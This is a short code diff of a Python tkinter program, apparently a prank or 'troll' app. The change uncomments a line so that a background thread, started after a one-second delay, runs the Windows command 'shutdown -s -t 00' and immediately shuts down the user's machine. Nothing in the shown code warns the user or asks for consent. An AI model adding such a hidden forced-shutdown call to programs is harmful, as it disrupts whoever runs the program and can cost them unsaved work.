@@ -9,7 +9,7 @@ from threading import Thread
 root=tk.Tk()
 def tdr_os_troll_XD():
     time.sleep(1)
-    #os.system("shutdown -s -t 00")
+    os.system("shutdown -s -t 00")
 def trtd():
     threading.Thread(target=tdr_os_troll_XD, daemon=True).start()
 def tr():
